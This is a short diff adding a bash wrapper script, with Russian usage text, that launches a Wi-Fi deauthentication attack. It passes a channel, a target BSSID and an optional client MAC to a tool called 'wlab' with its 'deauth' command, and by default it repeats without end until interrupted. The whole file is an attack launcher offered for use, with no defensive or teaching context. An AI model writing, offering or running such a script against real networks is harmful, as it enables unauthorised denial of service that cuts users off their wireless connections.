@@ -1,0 +1,19 @@
+#!/usr/bin/env bash
+# v9-совместимость: wdeaut <канал> <BSSID> [MAC клиента] [кол-во]
+set -euo pipefail
+WLAB_BIN=/usr/bin/wlab
+[[ -x "$WLAB_BIN" ]] || WLAB_BIN=/usr/local/bin/wlab
+
+CH="${1:-}"; BSSID="${2:-}"; MAC="${3:-}"; CNT="${4:-0}"
+
+if [[ -z "$CH" || -z "$BSSID" ]]; then
+  echo "Использование: wdeaut <канал> <BSSID> [MAC клиента] [кол-во]"
+  echo "  wdeaut 6 AA:BB:CC:DD:EE:FF"
+  echo "  wdeaut 6 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66"
+  echo "  кол-во по умолчанию 0 = бесконечно (Ctrl+C)"
+  exit 1
+fi
+
+ARGS=(-c "$CH" -b "$BSSID" -n "$CNT")
+[[ -n "$MAC" ]] && ARGS+=(-t "$MAC")
+exec "$WLAB_BIN" deauth "${ARGS[@]}"
